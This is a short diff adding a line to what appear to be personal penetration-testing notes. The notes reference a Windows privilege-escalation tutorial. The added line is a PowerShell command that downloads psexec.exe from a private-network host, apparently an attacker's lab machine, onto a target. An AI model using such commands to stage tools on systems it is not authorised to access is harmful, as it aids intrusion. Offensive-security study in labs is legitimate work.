@@ -5,6 +5,9 @@ http://www.fuzzysecurity.com/tutorials/16.html
 
 
 
+TO download anything using powershell : 
+powershell -command "Invoke-WebRequest http://10.11.0.41:8080/psexec.exe -OutFile psexec.exe
+
 
 
 Windows Exploit Compilation in Linux : 
